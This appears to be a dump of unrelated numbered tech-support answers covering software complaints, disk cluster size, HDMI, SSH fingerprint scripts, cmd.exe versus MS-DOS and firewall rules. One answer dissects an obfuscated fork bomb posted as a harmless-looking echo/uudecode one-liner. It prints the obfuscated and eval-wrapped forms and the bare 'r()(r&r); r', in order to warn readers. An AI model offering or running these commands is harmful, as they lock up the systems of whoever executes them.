1014410	NCH has some very useful software, but I'm never using them again. 18 months ago, I put their sound editor on my computer and it ruined Audacity so it wouldn't run unless I opened an existing Audacity project. They install all kinds of little hooks into other software. Beware NCH. As others have said, it's very difficult to impossible to remove NCH software. It's a shame.
1014269	Malware. It installs itself everywhere, then prevents you from uninstalling it. Basically this is a trojan. It took me almost an hour of hard work to get rid of it and I am a senior Windows professional. Most of the virus scanners don't react because this actually has some sound editing properties. Anyway, this company should be sued by everyone fooled to install this invasive and abusive piece of software.
908695	The computer restarted for some reason. And when it logged in again Windows detected that your profile was damage and used a temporary profile instead. This can happen, I'm not sure why. But as long as you got the right profile after a reboot there should not be any problem. Maybe someone else has a more detailed explanation.
943048	AFAIK, focus on OS X is dictated by the application doing the stealing as well as the application which currently has focus (it is possible, for example, to program an "autocratic" UI application, such as a game). That said, it may be practical in your situation to modify the focus-stealing app itself. Inside the app bundle is an Info.plist. Add the LSUIElement key and set it to 1. This will (should) remove all trace of UI or dock icon, though it will still be visible in activity monitor. If you need to interact with this app's UI on a regular basis, this probably isn't practical. It might be just what you need, however, if you don't need to do more than launch it. Assuming it works with that app, that is.
1001021	thumbs.db is where the thumbnail images for files are stored. They will only be visible if you have your folder options set to display hidden and system files. They are not viral. If you delete a thumbs.db file, the next time you open that folder, Windows will have to re-determine the thumbnail for each file. Also, in Folder Options, selecting "Do not cache thumbnails" will prevent the thumbs.db files from being created. However, these files help the computer navigate through your directories more quickly, so unless you have a specific reason for not needing or wanting them, just leave them alone.
1096154	We repair televisions that have had their HDMI IC's damaged by 'Hot Plugging'. Either the software has been corrupted, or the actual IC damaged, causing the HDMI input not to work. It seems to be a risk as the plug/sockets wear. Best not to take a risk, and switch off before inserting.
997337	In some contexts, the term "name server" can refer to servers that aren't part of the Internet Domain Name System. For example, a WINS server is a name server for Microsoft's legacy proprietary networking protocols. There may have been other legacy LAN systems that had their own types of name servers that weren't part of Internet DNS.
1006946	Cluster Slack Space You cannot access each individual byte on a storage medium separately. To do so would be terribly inefficient because the system needs some way of keeping track of which ones are used and which are free (i.e., a list), so doing so for each byte separately would create too much overheard (for each individual byte, i.e. 1-to-1, the list would be as big as the medium itself!) Instead, the medium is broken up into chunks, blocks, units, groups, whatever you want to call them (the technical term is clusters), each of which contains a—consistent—number of bytes (you can usually specify the size of the clusters since different uses call for different sizes to reduce waste). When a file is saved to disk, the size of the file is divided by the cluster size and rounded up if needed. This means that unless the filesize is exactly divisible by the cluster size, some of the cluster ends up being unused and thus wasted. When you view the properties for a file, you see the true size of the file as well as the size it takes up on disk which includes any “slack”, that is, the “cluster tips” that are unused. This is usually not much per-file and the size on disk will usually be almost equal to the actual size, but when you add up the wasted space from all the thousands of files on a drive, they can add up. Therefore, when you view the size of a large folder, especially one with many tiny files that are smaller than a cluster, the size on disk (i.e., the amount of disk space marked as used) can end up being significantly larger than the actual size (i.e., the amount space the files actual require). In a case like above, what you can try is to reduce the cluster size so that each file wastes less space. Generally, a drive with mostly lost of little files should use the smallest cluster size possible (to reduce waste) and a drive with mostly large files should use the largest cluster size possible (this way the bookkeeping structures end up being smaller). Even at a lower level, if each cluster is only a single sector, unless a file is an exact multiple of the size of the sectors on the drive (usually 512 bytes traditionally, now often 4,096 with Advanced Format disks), then there will still be unused space between the end of the file and the end of the sector. Compression Another scenario where you might see a difference between the actual file size and size on disk is with compression. When a drive is compressed (e.g., using DriveSpace, NTFS compression, etc.) then there will be a difference between the size of the actual file (which needs to be know), and the actual size that the file occupies (i.e., uses or “takes up”) on the disk. Shortcuts and Hardlinks Yet another scenario that could result in a difference is with hardlinks. With file-systems that support hardlinks, when a duplicate file is created, instead of making a whole new file that takes up space for itself, the file-system creates a shortcut to the file so that both (or all three, etc.) copies point to the same physical file on disk. Therefore, when there are two files pointing to the same data, they each have the same size, but take up only slightly more than the space to store a single copy.
1035333	Their products appear to do what they say they will do, and as far as I can tell do them well -- I've tried them so I know. That's the good news. The bad news is when the installation runs it tries to install a load of things on your system that you didn't ask for and didn't want, such as IE toolbars. It tried to change my IE homepage (without asking!) but Spybot told me about it as it attempted this, so I stopped this. I didn't catch a few other things, such as hosing up Internet Explorer so that whenever I try to start a new tab, it doesn't come up blank, but it runs to Google Mail! Which is really odd, actually. Gmail was set as my home page, and apparently, preventing NCH from changing my home page caused it to mess IE's tab-generating process up. I am not sure how to fix this. It also installed the Ask Toolbar without my permission. I don't know what else it installed (I'm still looking). When I uninstalled their product (the screen capture program), it didn't totally clean up after itself, either. The NCH Software folder was still in Program Files. I suspect other remnants remain.
1195235	Since you have asked for alternative: The less utility could be an alternative for tail -F. It will have to be run as follows: less --follow-name filename.log and press Shift + F. This will give you same results as tail -F.
956540	Even though the BIOS isn't detecting a system fan doesn't mean there isn't one. Not all fans, especially on older systems, are designed to actually transmit data to and from the BIOS, so it's possible you have a model that just turns on when there's power supplied to it, and shuts down when there's not. The only real downside to having a dumb fan rather than a smart fan, other than the disconcerting "0 RPM" message, is efficiency. A dumb fan will be on all the time, whether or not your system actually needs it. With smart fans, the BIOS can turn it on full during heavy use, shut it down when the system's idle, and warn you when it's not working properly. Even if it's missing entirely, it's not 100% necessary unless your system has a tendency to overheat without one. Older computers in general don't generate near as much heat as modern systems, so their cooling requirements are far less imposing than anything you'd find today.
993410	You can use devilspie to handle several behaviours under your Gnome's window manager, for instance the "always on top" you are searching for. Here's an example.
1185931	Just created small bash script which will print table with fingerprints for all key ciphers allowed on server (according to /etc/ssh/sshd_config) in both SSH-256 and MD5 algo. Here is an example output: +---------+---------+-----------------------------------------------------+ | Cipher | Algo | Fingerprint | +---------+---------+-----------------------------------------------------+ | RSA | MD5 | MD5:15:66:80:fd:79:d8:c0:92:e8:39:4a:bc:4e:c4:00:15 | | RSA | SHA-256 | SHA256:G+rKuLGk+8Z1oxUV3cox0baNsH0qGQWm/saWPr4qZMM | +---------+---------+-----------------------------------------------------+ | ECDSA | MD5 | MD5:f5:90:5c:03:2e:38:1b:c9:86:bd:86:47:5d:22:79:17 | | ECDSA | SHA-256 | SHA256:GGmuOzsG4EGeRV9KD1WK7tRf3nIc40k/5jRgbTZDpTo | +---------+---------+-----------------------------------------------------+ | ED25519 | MD5 | MD5:d1:5a:04:56:37:f4:75:19:22:e6:e5:d7:41:fd:79:fa | | ED25519 | SHA-256 | SHA256:QVdqYeVzvsP4n5yjuN3D2fu8hDhskOxQCQAV5f9QK7w | +---------+---------+-----------------------------------------------------+ +---[RSA 2048]----+ +---[RSA 2048]----+ +---[ECDSA 256]---+ +---[ECDSA 256]---+ +--[ED25519 256]--+ +--[ED25519 256]--+ |.oE. +.++ | | .o+= | | ... Eoo | | .. o.o.. .| | ooo++o.+*| | .o++o. +oo | | . o +oo. | | .o= = | | +.=.=.o . | | . .o *.. ..| | . oo.+o.o=| | ...o.+ | | + . . o.= | | ... X + | | . X.o.* | |o o ++o .. | | . o. ...+| | ..oo.o . | | = + .+ o | | .. = + o | | + = o o | |.+ .o.o .o | | + ..o| | =oo .+ | | o o .S . | | . .S o o | | . = S . | |... oo.S .E* * | | S ..| | .SO . . | | + | | . E. =o.. | | o | | .. o. . o *.O o| | . | | o B .o.. | | o | | .o. *.o. *. | | | | ... . o * * | | . | | E *..=.o| | . | | oo=... +. | | | | +. o + o| | E| | . +.+B+| | | |o+=.o....o+o | | | | .o+ . | | | | o.ooOX| +------[MD5]------+ +----[SHA256]-----+ +------[MD5]------+ +----[SHA256]-----+ +------[MD5]------+ +----[SHA256]-----+ Script will run also on servers with SSH version below 6.8 (before -E md5 option was added). Edit: Updated versions for even more recent versions of SSH which switched default ciphers now with ASCII images support. #!/bin/bash # server_ssh_fingerprints # # Version 0.2 # # 2016 Kepi <kepi@igloonet.cz # MIT License # # Print fingerprint matrix for all allowed Host Keys # with all allowed ciphers and MD5 and SHA-256 algos # # Changelog: # # 2018-03-11 (0.2): # - Support for newer versions of OpenSSH # - Added visual keys for all algos too - only in recent OpenSSH versions # standard sshd config path SSHD_CONFIG=/etc/ssh/sshd_config # helper functions function tablize { awk '{printf(" | %-7s | %-7s | %-51s |\n", $1, $2, $3)}' } LINE=" +---------+---------+-----------------------------------------------------+" # header echo "$LINE" echo "Cipher" "Algo" "Fingerprint" | tablize echo "$LINE" declare -A ALGOS declare -a ASCII # fingerprints while read -r host_key; do cipher=$(echo "$host_key" | sed -r 's/^.*ssh_host_([^_]+)_key\.pub$/\1/'| tr 'a-z' 'A-Z') if [[ -f "$host_key" ]]; then if ssh-keygen -E md5 -l -f "$host_key" &>/dev/null; then IFS=$'\n' for algo in md5 sha256; do n=0 for line in $(ssh-keygen -E $algo -lv -f "$host_key"); do n=$(( n + 1)) if [[ $n -eq 1 ]]; then ALGOS[$algo]=$(echo "$line" | awk '{print $2}') else ASCII[$n]="${ASCII[$n]} ${line}" fi done done else ALGOS[md5]=$(ssh-keygen -l -f "$host_key" | awk '{print $2}') ALGOS[sha256]=$(awk '{print $2}' "$host_key" | base64 -d | sha256sum -b | awk '{print $1}' | xxd -r -p | base64) fi echo "$cipher" MD5 "${ALGOS[md5]}" | tablize echo "$cipher" SHA-256 "${ALGOS[sha256]}" | tablize echo "$LINE" fi done < <(awk '/^HostKey/ {sub(/^HostKey\s+/,"");print $0".pub"};' $SSHD_CONFIG) echo for line in "${ASCII[@]}"; do echo "$line" done This is just pretty print using information from JonnyJD's answer. Thanks.
1165311	Before I begin answering the question, think about this: if DualShock uses Bluetooth, then how does the PlayStation establish a connection to all 4 controllers with a single radio? I use Scarlet.Crush's SCP drivers, and they seem to have great Bluetooth support (I use regular USB). They require sacrificing one Bluetooth dongle to install SCP drivers on it, which replace the original Bluetooth drivers/stack (meaning the dongle will be dedicated to connecting DualShock controllers and nothing more). The fact that plural in "controllers" is used frequently in the documentation confirms that you are able to connect all four controllers into a single dongle. Due to the controller's hardware limitations (4 lights) and SCP's own limitations as a result, you can only have up to four controllers connected at once. Since a concurrent connection to 4 devices are supported by a majority of Bluetooth radios (the forum post above lists them out) and this does not even come near to the spec's hard limit of 7, there is no doubt you will be able to connect all 4 controllers with a single dongle, regardless of whether they are DS3 or DS4, given that everything is correctly configured and paired up.
1178831	First, let's look at the whole command: echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode It contains a double-quoted string that gets echoed to uudecode. But, note that, within the double-quoted string is a back-quoted string. This string gets executed. The string is: `rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r` If we look at what's in it, we see three commands: rYWdl & r()(Y29j & r{,3Rl7Ig} & r{,T31wo}) r Performing brace expansion on the middle command, we have: rYWdl & r()(Y29j & r r3Rl7Ig & r rT31wo) r The first line tries to run a nonsense command in background. This is unimportant. The second line is important: it defines a function r which, when run, launches two copies of itself. Each of those copies would, of course, launch two more copies. And so on. The third line runs r, starting the fork bomb. The rest of the code, outside of the back-quoted string, is just nonsense for obfuscation. How to run the command safely This code can be run safely if we set limit on function nesting level. This can be done with bash's FUNCNEST variable. Here, we set it to 2 and this stops the recursion: $ export FUNCNEST=2 $ echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode bash: rYWdl: command not found bash: Y29j: command not found bash: r: maximum function nesting level exceeded (2) bash: r: maximum function nesting level exceeded (2) bash: r: maximum function nesting level exceeded (2) bash: Y29j: command not found bash: r: maximum function nesting level exceeded (2) bash: Y29j: command not found uudecode fatal error: standard input: Invalid or missing 'begin' line The error messages above show that (a) the nonsense commands rYWdl and Y29j are not found, (b) the fork bomb gets repeatedly stopped by FUNCNEST, and (c) the output of echo does not start with begin and, consequently, is not valid input for uudecode. The fork bomb in its simplest form What would the fork bomb look like if we removed the obscuration? As njzk2 and gerrit suggest, it would look like: echo "`r()(r&r);r`" We can simplify that even further: r()(r&r); r That consists of two statements: one defines the fork-bomb-function r and the second runs r. All the other code, including the pipe to uudecode, was there just for obscuration and misdirection. The original form had yet another layer of misdirection The OP has provided a link to the chann board discussion on which this code appeared. As presented there, the code looked like: eval $(echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode) Notice one of the first comments about this code: I fell for it. Copied only the part that echoes and decodes, but still got forkbombed In the form on the chann board, one would naively think that the problem would be the eval statement operating on the output of uudecode. This would lead one to think that removing eval would solve the problem. As we have seen above, this is false and dangerously so.
958970	I found the answered buried in this post. The new setpci command is sudo setpci -s 00:03.0 0x7b.b=19 btw, this setting isn't "sticky" and won't persist across reboots-- it has to be set upon each boot. You can put this command in a bash script and run it on startup. See here for details on start-up scripts.
1163136	Explanation : When you use your HDMI Port your graphic card is solicitation much more than normal if the laptop is not cooling properly it could result in extreme overheat. Solution : You need to open your laptop to clean it from dirt and replace it's cooling pate.
1039350	Yes, all these monitor ports are hot pluggable. I've plugged and unplugged my HDMI device many times and there was never no problem.
949622	I'm also using Ubuntu 10.04 and I can connect to my machines using their name. Say I have computers named ernie and bert that are on the same network: ernie:~$ ping bert.local ernie:~$ echo hello > file.txt ernie:~$ scp file.txt bert.local:~/copied-from-ernie.txt You can use this in nautilus too. Enter ssh://bert.local into the nautilus location bar in ubuntu (hit Ctrl-L to select the location bar) and hit enter. If you have different user names use ssh://username@bert.local I think you can do something similar in the Finder location bar. You have to install/enable sshd for this to work: Ubuntu: sudo apt-get install openssh-server (you may need to restart) Mac: System Preferences --> Sharing. Check the "Remote Login" box.
1042982	This was true once, but it isn't anymore. From MS-DOS # Windows command-line interface - Wikipedia: All versions of Microsoft Windows have had an MS-DOS like command-line interface (CLI). This could run many DOS and variously Win32, OS/2 1.x and Posix command line utilities in the same command-line session, allowing piping between commands. The user interface, and the icon up to Windows 2000, followed the native MS-DOS interface. Consumer Windows (up to 3.11, Win9x, WinME) ran as a Graphical User Interface (GUI) running on top of MS-DOS. With Windows 95, 98, and ME the MS-DOS part was integrated, treating both operating systems as a complete package. The command line accessed the DOS command line (usually command.com), through a Windows module (winoldap.mod). A new line of Windows, (Windows NT), boot through a kernel whose sole purpose is to load Windows. One can not run Win32 applications in the loader system in the manner that OS/2, UNIX or Consumer Windows can launch character mode sessions. So no, in every Windows from the NT family (e.g., XP, Vista, 7, 8), the command prompt and MS-DOS are visually similar, but quite different.
793952	From what I understand, GRE is one of the lesser important factors in whether a department should decide to admit a student or not. Since a PhD is about research, research experience/potential/output is what people care about in this case, not so much numbers like GPA/GRE. If the department requires it regardless, then there's nothing you can do about that. But if it's not required, don't worry about it so much and focus on getting good recommendations and producing good research since that will matter much more. Remember that due to the current pandemic situation, people have had increased difficulty just being able to take the GRE exam. So generally departments are understanding of the situation. But even in normal times, GRE was just really a filtering mechanism, and not really the main point of attention for those responsible for graduate/PhD admissions.
788183	Actually, you have a lot of freedom to do it as best pleases you. You could even create an alter ego (as I have here) under which to publish. But there are two constraints. The first is that you probably want to choose a name that you will be happy with over your career, so that people won't get confused by seeing different names from the same author. The second is that you want people to be able to find and connect with you. Mostly that will be via email, I suspect, but if someone calls up your university and asks for you by your public persona name it should be easy to reach you personally. If you just use the name you have used here, few people outside your own culture would even notice and just assume that your "family" name is Sabu. Some names in Western European culture arose in just that way. Others arose from peoples occupation (Taylor and Smith, for example). But people might also want to refer to you as Professor Sabu, rather than Professor Aaron, which you might prefer. But, don't worry that there are conventions that restrict your choices here. Assume that you have control over your own name.
1039353	According to the HDMI specification, yes it's hot-pluggable. It supports "HPD" (Hot Plug Detect Signal). The HPD (Hot-Plug-Detect) feature is a communication mechanism between a source and a sink device that makes the source device aware that it has been connected/disconnected to/from the sink device. When an HDMI cable is inserted between the two devices, the resulting hot-plug detection instantiates a start-up communication sequence. source 1 source 2 source 3
1234798	For me the fix was (right click on Kmplayer) "Main Controls" -> "Audio" -> "Audio Renderer" and set it to "Default Device". I had headphones selected as the device to be used and it only played audio for the first instance and the rest had no sound, but when I set 'Audio Renderer' to 'default device' I had audio for multiple instances again.
843926	The inclusion of the word stochastic simply means the random samples from the training data are chosen in each run to update parameter during optimisation, within the framework of gradient descent. Doing so not only computed errors and updates weights in faster iterations (because we only process a small selection of samples in one go), it also often helps to move towards an optimum more quickly. Have a look at the answers here, for more information as to why using stochastic minibatches for training offers advantages. One perhaps downside, is that the path to the optimum (assuming it would always be the same optimum) can be much noisier. So instead of a nice smooth loss curve, showing how the error descreases in each iteration of gradient descent, you might see something like this: We clearly see the loss decreasing over time, however there are large variations from epoch to epoch (training batch to training batch), so the curve is noisy. This is simply because we compute the mean error over our stochastically/randomly selected subset, from the entire dataset, in each iteration. Some samples will produce high error, some low. So the average can vary, depending on which samples we randomly used for one iteration of gradient descent.
949819	It's not the smartest way to share files, but on Ubuntu you can simply use Share Folder option in the context menu, set settings as you wish and thats all. (Relogin may be required.) Then on MAC Ubuntu share should be discoverable.
789179	Yes, absolutely add it, along with the publications that resulted. And, you should consider getting a letter of recommendation from the professor. Your lack of formal affiliation is of no consequence. It is the work that matters. Don't hesitate here.
956499	The difference between the CPU fan and the system fan is that the former is the one attached to the heatsink of the processor, and the latter is generally on one of the sides of the case to exhaust hot air. The BIOS determines which is which, though, by the mere fact that one is plugged to the cpu_fan plug of the mainboard and the other is on the sys_fan, so it could be reversed without much problem if one would have any occult reason to do so (or just a broken plug). You can safely use the computer without a sys_fan as long as the cpu and the other components run at temperatures inside their safety ranges, which is quite probable that they do, even without system fan, as long as the computer isn't under heavy load or naturally power hungry.
911574	YES. A micro-atx motherboard will work fine with an ATX case and power supply. Atx cases normaly included the standoff mounts for smaller mirco-atx motherboards. In fact, I have a micro-ATX motherboard in a full size ATX case and power supply. MicroATX was intended to be backward compatible. http://en.wikipedia.org/wiki/MicroATX microATX was explicitly designed to be backward-compatible with ATX. The mounting points of microATX motherboards are a subset of those used on full-size ATX boards, and the I/O panel is identical. Thus, microATX motherboards can be used in full-size ATX cases. Furthermore, most microATX motherboards generally use the same power connectors as ATX motherboards,[6] thus permitting the use of full-size ATX power supplies with microATX boards. microATX boards often use the same chipsets (northbridges and southbridges) as full-size ATX boards, allowing them to use many of the same components. However, since microATX cases are typically much smaller than ATX cases, they usually have fewer expansion slots.
886825	They're "protected" for this exact reason. They don't want you to move them to your computer. You'd have to look into some kind of DRM circumvention, and I'm not going into that.
1165140	I think this is much more complex than a single answer. There are many different types of Bluetooth connections, not all of these connections are interchangeable. It also depends heavily upon which version of Bluetooth is being used in the devices, both the reciever for the PC and the controller. As you can see from the Bluetooth 4.2 specification, which is 2,772 pages, it is quite complex. Bluetooth 4.2 specification document: https://www.bluetooth.org/DocMan/handlers/DownloadDoc.ashx?doc_id=286439 I doubt a definitive answer can be given to this question as to all Bluetooth devices in all scenarios. I would however in this case as it's quite a simple scenario, purchase a single Bluetooth adapter and try to connect four controllers. I suspect that it will work from what I have deduced from the Bluetooth specification but I would ensure that you purchase a 4.2 Bluetooth adapter. Apple Website FAQ The official Bluetooth specifications state seven is the maximum number of Bluetooth devices that can be connected at once. However, three to four devices is a practical limit, depending on the types of devices and profiles are used. Some devices require more Bluetooth data, so they are more demanding than other devices. Data-intensive devices may reduce the total number of devices that can be active at the same time. If a Bluetooth device becomes slow to connect or does not perform reliably, reduce the total number of connected devices. Apple Website Bluetooth FAQ As can be seen from the official Apple website they state that the maximum number of connected devices is 7. The official Bluetooth spec says that up to 255 sleeping devices can be connected. This would indicate that the maximum number of parallel active connections is 7, however due to the complexity of the connections and amount of data to be transferred in most scenarios the practical limit is 3 or 4. Bluetooth signal can also be effected largely by other household devices such as Wifi, Microwaves and Household Phones. A true answer to this would be difficult to come by in relation to your exact scenario due to the large number of variables, however we can see that theoretically seven devices can have active connections in parallel and as reported by Apple the practical limit in the majority of scenarios is 3 or 4.
900595	Inbound rules allow other system to connect to yours, ex if you would like someone to connect to your windows shares, ftp, web server etc. Outbound rules allow applications on you system to connect to other systems, ex if you want to connect to a web site, IM or some elses ftp. Both the inbound and outbound rules will have no effect if your firewall is off.
1144900	I know this is old, but this was a really infuriating change Microsoft made. I get that it is due to competing internal teams and Windows > OneNote/Office, but still... I used Win+N daily, as did a lot of people. Anyway, here's what I did to "fix the glitch": Installed AutoHotkey (Freeware scriptable key remapping software) In the default script file it creates in your Documents folder: AutoHotKey.ahk I added the following: #n::#!n That basically says: #n [Win+N] = [Win+Alt+N] Save, then hit the reload script from the tasktray menu for AutoHotkey and viola, SOLVED! Omg finally... geez that one was killin me for ages. Now reap the benefits of AutoHotkey... because holy crap that is an awesome app. I'm only 15min in, but I have already added a ton of frequently used things to it including even code blocks for when I dev Lol. I love it. Anyway, hope this helps you if still needed, and if for nothing else, the next google searcher such as myself. :)
1010153	Inbound rules filter traffic passing from the network to the local computer based on the filtering conditions specified in the rule. Conversely, outbound rules filter traffic passing from the local computer to the network based on the filtering conditions specified in the rule. Both inbound and outbound rules can be configured to allow or block traffic as needed. These rules are not useful when firewall is off.
939081	I have used express invoice for a year now, and it was great until developed a bug. I was on the internet for days trying to figure out this bug, that I discovered other users also encountered. No solution was working including an upgraded download. I would have bought the paid version but was wary considering their support policy. Try contacting this company for anything..they make it very very difficult. There is actually no way to contact the company unless you purchase support. First two levels of support cost 40 and 57 dollars US and only entitle you to a very limited amount of emails from support...and they will only spend 10 minutes on each email. I chose the platinum support, 9 -10 minute emails and two 15 minute phone calls only from 9 to five for 63 bucks US, I must use them all over a three month period or I lose what I have bought and the cheaper support pkgs. Are even shorter in terms of access. So far, I have paid and they are already past the 24 hour turnaround time promised for a response. They also make you agree to no refund even if they do not fix your problem. Buy at your own risk, this company has blatantly decided to make support a frustrating endeavor for their users.
1043024	No. (Unless your definition of equality does not extend past »It is a text interface and I can run programs from it.«) What is run when you click Command Prompt in the Start Menu is the Windows Command Processor, a.k.a. cmd.exe. Its built-in commands and scripting syntax (including many quirks) are based on the ancient command.com from CP/M and later MS-DOS, but apart from that they are completely separate things. Also, command.com is a 16-bit program while cmd.exe is a native Windows console application. Things were different in Windows 95, 98 and ME where command.com would be run in a MS-DOS VM with Windows acting as the hypervisor (yes, they had that sort of thing at the time already). There you had an entire virtual machine running DOS. But on Windows NT, 2000, XP, Vista and 7 – no. DOS only lives on there in ntvdm.exe which is the NT Virtual DOS Machine which is just a thin emulation layer capturing calls that the CPU cannot execute directly (which is why it works faster but worse than DOSBox). In any case, even command.com was just a shell for DOS. It wasn't the operating system. Inside, I actually cringe each time I see people referring to a window with gray-on-black text as MS-DOS. In the vast majority of cases they don't actually know what they're referring to.
1042985	From what I understand, MS-DOS is the disk operating system that Microsoft released. The command prompt is a non-graphical interface that allows you to interact with your operating system. Command Prompt is a command line interpreter application available in most Windows operating systems, officially called the Windows Command Processor but sometimes called the command shell. Command Prompt is a Windows program that emulates many of the command line abilities available in MS-DOS but it is not actually MS-DOS. Command Prompt is a GUI version of command.com in MS-DOS. cmd.exe is a native Windows application usually running in a Win32 console. This allows it to take advantage of features available to native programs on the platform that are otherwise unavailable to DOS programs. For example, since cmd.exe is a native text-mode application on OS/2, it can use real pipes in command pipelines, allowing both sides of the pipeline to run concurrently. As a result, it is possible to redirect the standard error in cmd.exe, unlike COMMAND.COM. (COMMAND.COM uses temporary files, and runs the two sides serially, one after the other.) In reality, cmd.exe is a Windows program that acts as a DOS-like command line interpreter. It is generally compatible, but provides extensions which address some of the limitations of COMMAND.COM (above explanations are referred by Wikipedia).
1051677	I have developed a solution which allows you to have a scrolling desktop on Windows. It's complete freeware and there are multiple ways to enhance your desktop. Infinite_Screen at http://ynea.futureware.at The standard is pressing Ctrl+ (moving mouse to the edges) or CtrlShift+ (mouse move) and four others.
949613	Assuming you want to share on a local network On OS X. Click on System Preferences --> Sharing. Make sure the Services tab is selected. Choose one of the sharing methods, either UNIX sharing or Windows sharing. On your Ubuntu machine, go to Places --> Connect to server and enter the sharing details. Have a look at this forum http://ubuntuforums.org/showthread.php?t=353584
843937	In Gradient Descent or Batch Gradient Descent, we use the whole training data per epoch whereas, in Stochastic Gradient Descent, we use only single training example per epoch and Mini-batch Gradient Descent lies in between of these two extremes, in which we can use a mini-batch(small portion) of training data per epoch, thumb rule for selecting the size of mini-batch is in power of 2 like 32, 64, 128 etc. For more details: cs231n lecture notes
995712	chkdsk /r does the same thing as chkdsk /f only it also checks for bad sectors on the disk and recovers any readable information. Running chkdsk /r implies that also chkdsk /f is run. chkdsk /f only checks for disk errors, not bad sectors. Microsoft has a detailed page for chkdsk. The following is a snippet explaining /f and /r parameters. Fixing disk errors: Chkdsk corrects disk errors only if you specify the /f command-line option. Chkdsk must be able to lock the drive to correct errors. Because repairs usually change a disk's file allocation table and sometimes cause a loss of data, chkdsk sends a confirmation message. Finding physical disk errors: Use the /r command-line option to find physical disk errors in the file system.
1203436	I edit my huge files with Microsoft Visual Studio. It is super fast and handles any size! try it! You can download free version (Community edition) UPDATE: Notepad++ build 64bit is available now. You can use it.
1048707	Use Enter ~ . to exit a frozen SSH connection, then just start a new one in its place. Alternatively, run pkill ssh from a new terminal, to kill all SSH connections. Better yet, try mosh, which is designed to remain connected even after connection loss or even network reconfiguration. (The Reset menu item is not going to work, because it only resets the terminal window's state [similar to turning a monitor off and on again], but it does not know anything about what is actually running in that terminal window.)
1227461	Another option is to get rid of CoreStorage if an OS X machine is available to you. This would also get rid of decryption if you're using it and you would have to wait until the decrypt is finished (plugged into power and booted into OS X, even recovery). You would need to boot to a disk that isn't the one in mind, preferably internet recovery (if available, command-option-r on reboot). Open up the terminal and do a: diskutil cs list The output should show your CoreStorage volumes and all, one of them is its Revertible status. If it indicates Yes then you'll be in good shape to proceed. Next you would run: diskutil cs revert /dev/ diskXsY (Where X is the disk number and Y is the partition number). You can check its status afterwards with the same "diskutil cs list" command. If it wasn't encrypted it should already be back to a standard GPT partition layout and you can try to mount it again in Arch. It should still be journaled which will keep it read-only, if you want to toggle that you can do so in Disk Utility. If it was encrypted the process will take a while but "diskutil cs list" will show you the progress as a percentage. I've had no issues mounting non-CoreStorage HFS+ drives and partitions on Arch myself. I did eventually move the data, repartition as ext4 and move the data back to them.
907521	It has to do with the allocation unit sizes used on your disk when it was first formatted. Imagine you have two 2 x 10 gallon gas cans in your car. Each gas can is an allocation unit. You need to get 12 Gallons of gas, so you need to use both cans. Basically using 20 Gallons of allocated space - but only filling 12 gallons. Here is the default size for Windows XP Drive size (logical volume) Cluster size Sectors ---------------------------------------------------------- 512 MB or less 512 bytes 1 513 MB - 1,024 MB (1 GB) 1,024 bytes (1 KB) 2 1,025 MB - 2,048 MB (2 GB) 2,048 bytes (2 KB) 4 2,049 MB and larger 4,096 bytes (4 KB) 8 If you think of the Cluster size as each of your gas cans: Holding 4KB of "gas" each. But your file is 2KB then the fills size is 2K, but size on disk is 4KB
900591	If the Windows Firewall is turned off then it will have no effect, and the Inbound and Outbound rules will mean nothing. Inbound rules: These are to do with other things accessing your computer. If you are running a Web Server on your computer then you will have to tell the Firewall that outsiders are allowed to connect to it. Outbound rules: These are so that you can let some programs use the Internet, and Block others. You will want to let your Web Browser (Internet Explorer, Firefox, Safari, Chrome, Opera...) have access to the Internet, so you will tell Windows Firewall that it's allowed.
